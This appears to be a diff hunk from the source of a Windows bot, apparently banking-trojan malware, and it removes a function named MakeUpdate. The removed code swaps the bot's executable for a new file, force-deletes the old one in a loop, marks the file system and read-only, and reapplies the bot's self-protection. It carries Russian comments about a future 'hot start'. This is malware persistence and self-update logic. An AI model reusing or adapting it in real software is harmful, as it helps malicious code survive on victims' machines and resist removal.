@@ -867,47 +867,6 @@ DWORD GetVirtualFreeAddr()
 	return dwAddr;
 }
 
-bool MakeUpdate(PCHAR FileName )
-{
-	PCHAR BotPath = BOT::GetBotFullExeName();
-
-	if (BotPath == NULL)
-		return false;
-
-
-	if (FileExistsA(BotPath))
-	{
-		BOT::Unprotect();
-		pSetFileAttributesA( BotPath, FILE_ATTRIBUTE_ARCHIVE );
-
-		// Принудительно удаляем старый файл
-		while (1)
-		{
-			pDeleteFileA(BotPath);
-			if (!FileExistsA(BotPath)) break;
-            pSleep(100);
-        }
-
-	}
-
-	bool Result = pMoveFileExA(FileName, BotPath, MOVEFILE_REPLACE_EXISTING ) != 0;
-	pSetFileAttributesA(BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
-
-
-	/* TODO :
-		В данной ветке, при обновлении бота, не запускаем новый экземпляр.
-		В дальнейшем необходимо  проработать методику "горячего" старта бота
-	*/
-
-	BOT::Protect(BotPath);
-
-//	RunFileA(BotPath);
-//	pExitProcess(1);
-
-	STR::Free(BotPath);
-
-	return Result;
-}
 
 DWORD GetFileHash( WCHAR *File )
 {
